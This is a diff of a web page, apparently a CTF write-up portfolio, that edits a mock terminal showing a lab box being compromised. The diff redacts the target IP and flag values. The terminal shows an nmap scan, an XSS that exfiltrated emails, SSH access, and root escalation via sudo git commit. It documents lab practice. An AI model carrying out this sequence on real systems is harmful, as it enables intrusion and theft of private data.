@@ -715,7 +715,7 @@
       <div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div>
     </div>
     <div class="terminal-body">
-      <div><span class="prompt">kali@attacker</span>:~$ <span class="cmd">nmap -sC -sV -p- -T4 192.168.62.128 -oN box3_nmap.txt</span></div>
+      <div><span class="prompt">kali@attacker</span>:~$ <span class="cmd">nmap -sC -sV -p- -T4 [target] -oN box3_nmap.txt</span></div>
       <div class="out">PORT      STATE SERVICE VERSION</div>
       <div class="out">25/tcp    open  smtp    Postfix smtpd</div>
       <div class="out">80/tcp    open  http    Apache 2.4.65</div>
@@ -728,9 +728,9 @@
       <div class="success">[+] OPTIONS preflight received -- XSS handler fired</div>
       <div class="success">[+] POST received -- 19 emails exfiltrated (238 KB)</div>
       <div>&nbsp;</div>
-      <div><span class="prompt">kali@attacker</span>:~$ <span class="cmd">ssh webmaster@192.168.62.128 -p 1222</span></div>
+      <div><span class="prompt">kali@attacker</span>:~$ <span class="cmd">ssh webmaster@[target] -p 1222</span></div>
       <div class="out">webmaster@7b16d12ebfcb:~$ cat user.txt</div>
-      <div class="flag">5038{Xss_Email_Leakage}</div>
+      <div class="flag">5038{Xss_...} — Captured</div>
       <div>&nbsp;</div>
       <div><span class="prompt">kali@attacker</span>:~$ <span class="cmd">sudo /usr/bin/git commit</span></div>
       <div class="out">[master (root-commit)] pwn</div>
@@ -738,7 +738,7 @@
       <div class="out">rootbash-5.2# whoami</div>
       <div class="success">root</div>
       <div class="out">rootbash-5.2# cat /root/root.txt</div>
-      <div class="flag">5038{Unit_Tests_C@n_Somet1mes_Be_Bad_4_You}</div>
+      <div class="flag">5038{Unit_Tests_...} — Captured</div>
     </div>
   </div>
 </section>
